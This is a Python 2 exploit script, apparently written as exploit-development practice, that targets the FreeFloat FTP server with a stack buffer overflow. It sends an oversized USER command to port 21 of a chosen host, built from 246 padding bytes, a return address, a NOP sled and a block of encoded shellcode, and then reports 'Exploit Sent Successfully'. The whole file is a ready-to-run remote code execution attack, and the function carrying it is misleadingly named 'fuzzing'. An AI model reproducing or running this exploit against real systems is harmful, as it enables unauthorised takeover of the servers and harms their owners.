#! /usr/bin/python 
# Name: Rio Atmadja
# Program: Exploit Development freefloatftp 

import sys
import socket 

def fuzzing(hostname):

	shellcode = ( "\xda\xc9\xb8\x2f\xb5\x16\x50\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
	"\x56\x31\x47\x18\x03\x47\x18\x83\xc7\x2b\x57\xe3\xac\xdb\x1e"
	"\x0c\x4d\x1b\x41\x84\xa8\x2a\x53\xf2\xb9\x1e\x63\x70\xef\x92"
	"\x08\xd4\x04\x21\x7c\xf1\x2b\x82\xcb\x27\x05\x13\xfa\xe7\xc9"
	"\xd7\x9c\x9b\x13\x0b\x7f\xa5\xdb\x5e\x7e\xe2\x06\x90\xd2\xbb"
	"\x4d\x02\xc3\xc8\x10\x9e\xe2\x1e\x1f\x9e\x9c\x1b\xe0\x6a\x17"
	"\x25\x31\xc2\x2c\x6d\xa9\x69\x6a\x4e\xc8\xbe\x68\xb2\x83\xcb"
	"\x5b\x40\x12\x1d\x92\xa9\x24\x61\x79\x94\x88\x6c\x83\xd0\x2f"
	"\x8e\xf6\x2a\x4c\x33\x01\xe9\x2e\xef\x84\xec\x89\x64\x3e\xd5"
	"\x28\xa9\xd9\x9e\x27\x06\xad\xf9\x2b\x99\x62\x72\x57\x12\x85"
	"\x55\xd1\x60\xa2\x71\xb9\x33\xcb\x20\x67\x92\xf4\x33\xcf\x4b"
	"\x51\x3f\xe2\x98\xe3\x62\x6b\x6d\xde\x9c\x6b\xf9\x69\xee\x59"
	"\xa6\xc1\x78\xd2\x2f\xcc\x7f\x15\x1a\xa8\x10\xe8\xa4\xc9\x39"
	"\x2f\xf0\x99\x51\x86\x78\x72\xa2\x27\xad\xd5\xf2\x87\x1d\x96"
	"\xa2\x67\xcd\x7e\xa9\x67\x32\x9e\xd2\xad\x45\x98\x1c\x95\x06"
	"\x4f\x5d\x29\xb9\xd3\xe8\xcf\xd3\xfb\xbc\x58\x4b\x3e\x9b\x50"
	"\xec\x41\xc9\xcc\xa5\xd5\x45\x1b\x71\xd9\x55\x09\xd2\x76\xfd"
	"\xda\xa0\x94\x3a\xfa\xb7\xb0\x6a\x75\x80\x53\xe0\xeb\x43\xc5"
	"\xf5\x21\x33\x66\x67\xae\xc3\xe1\x94\x79\x94\xa6\x6b\x70\x70"
	"\x5b\xd5\x2a\x66\xa6\x83\x15\x22\x7d\x70\x9b\xab\xf0\xcc\xbf"
	"\xbb\xcc\xcd\xfb\xef\x80\x9b\x55\x59\x67\x72\x14\x33\x31\x29"
	"\xfe\xd3\xc4\x01\xc1\xa5\xc8\x4f\xb7\x49\x78\x26\x8e\x76\xb5"
	"\xae\x06\x0f\xab\x4e\xe8\xda\x6f\x7e\xa3\x46\xd9\x17\x6a\x13"
	"\x5b\x7a\x8d\xce\x98\x83\x0e\xfa\x60\x70\x0e\x8f\x65\x3c\x88"
	"\x7c\x14\x2d\x7d\x82\x8b\x4e\x54")

	password = "user"
	username = '\x41' * 246 + "\x53\x93\x42\x7E" + '\x90' * 16 + shellcode 
	connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		#connect to the host 
		connect.connect((hostname, 21))

	except:

		print "[-] Connection Error"
		response = connect.recv(2000)
		print response
		sys.exit(1)

	#send username to the server 
	connect.send("user %s\r\n" %username)
	response = connect.recv(2000)
	#print response 

	#send password to the server 
	connect.send("pass %s\r\n" %password)
	response = connect.recv(2000)
	#print response 

	connect.close()
	print "[+] Sending Evil Username " + str(len(username)) + " Bytes "
	print "[+] Exploit Sent Successfully"
        print "\r"

if __name__ == '__main__':
	try:
		target = sys.argv[1]

	except IndexError:
		print 'Usage: %s <target> ' % sys.argv[0]
		sys.exit(-1)
	
	fuzzing(target)
